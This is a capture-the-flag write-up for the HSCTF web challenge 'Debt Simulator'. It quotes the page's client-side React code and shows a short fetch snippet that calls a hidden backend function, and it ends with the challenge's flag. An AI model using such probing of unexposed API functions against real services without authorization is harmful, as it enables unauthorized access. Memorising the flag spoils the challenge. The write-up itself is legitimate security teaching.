# Debt Simulator
## Problem

![Webpage](./images/webpage.png)
Author: Madeleine

## Solution
In Developer Tools > Sources > debt-simulator.web.hsctf.com > static > js > App.js, there is a code explaining what happens when the button is pressed. 
```js
  const onClick = () => {
    const isGetCost = Math.random() > 0.4 ? true : false;
    const func = isGetCost ? 'getCost' : 'getPay';
    const requestOptions = {
      method: 'POST',
      body: 'function=' + func,
      headers: { 'Content-type': 'application/x-www-form-urlencoded' }
    }

    fetch("https://debt-simulator-login-backend.web.hsctf.com/yolo_0000000000001", requestOptions)
    .then(res => res.json())
    .then(data => {
      data = data.response;
      if (buttonText === "Play Again" || buttonText === "Start Game") {
        setButtonText("Next Round");
        setRunningTotal(0);
      }
      setMessage("You have " + (isGetCost ? "paid me " : "received ") + "$" + data + ".");
      setRunningTotal(runningTotal => isGetCost ? runningTotal - data : runningTotal + data);
    });
  }
```
It randomly picks either `getCost` or `getPay` and requests the information from the backend site. However, when you *visit* this site, you can see that there is also another allowed function: `getgetgetgetgetgetgetgetgetFlag`.

From here, you can copy `requestOptions` and the `fetch` Promise chain into the DevTools console, replacing the body with the new function and the final `.then(...)` with a print statement.

```js
    const requestOptions = {
      method: 'POST',
      body: 'function=getgetgetgetgetgetgetgetgetFlag',
      headers: { 'Content-type': 'application/x-www-form-urlencoded' }
    }

    fetch("https://debt-simulator-login-backend.web.hsctf.com/yolo_0000000000001", requestOptions)
    .then(res => res.json())
    .then(data => console.log(data));
```

Flag: `flag{cl13nt_51de_5uck5_135313531}`